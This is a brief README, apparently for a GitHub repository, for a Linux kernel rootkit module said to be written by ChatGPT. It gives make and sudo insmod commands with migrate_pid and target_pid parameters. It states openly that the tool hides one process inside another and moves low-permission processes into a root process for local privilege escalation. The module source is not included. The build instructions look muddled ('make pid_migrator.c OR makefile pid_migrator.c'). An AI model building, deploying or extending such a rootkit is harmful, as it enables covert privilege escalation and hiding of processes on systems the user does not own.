# Linux-Module-Process-Mogrator-Rootkit
Written by ChatGPT receiving target PID and Migrate PID in command line

make pid_migrator.c OR makefile pid_migrator.c
sudo insmod pid_migrator.ko migrate_pid=<MIGRATE_PID> target_pid=<TARGET_PID>


EDIT <Migrate PID> for the pid you are moving and <Target PID> for the task process you are hiding it in.

This is a Linux Kernel Rootkit so be careful
TO BE USED TO MIGRATE LOW PERMISSION PROCESSES TO ROOT PROCESS FOR LOCAL PRIVILEGE ESCALATION

